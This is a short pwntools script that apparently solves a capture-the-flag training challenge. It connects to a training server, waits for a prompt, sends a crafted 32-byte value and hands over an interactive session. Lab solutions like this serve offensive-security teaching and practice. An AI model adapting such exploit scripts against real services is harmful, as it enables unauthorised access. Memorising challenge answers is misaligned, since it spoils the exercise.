from pwn import *

r = remote("bin.training.offdef.it", 2021)
r.recvuntil(b"continue:")
r.send(int("34920187112902781278311238100717355388774617574960413476778239561435950620704").to_bytes(32, "big"))
r.interactive()
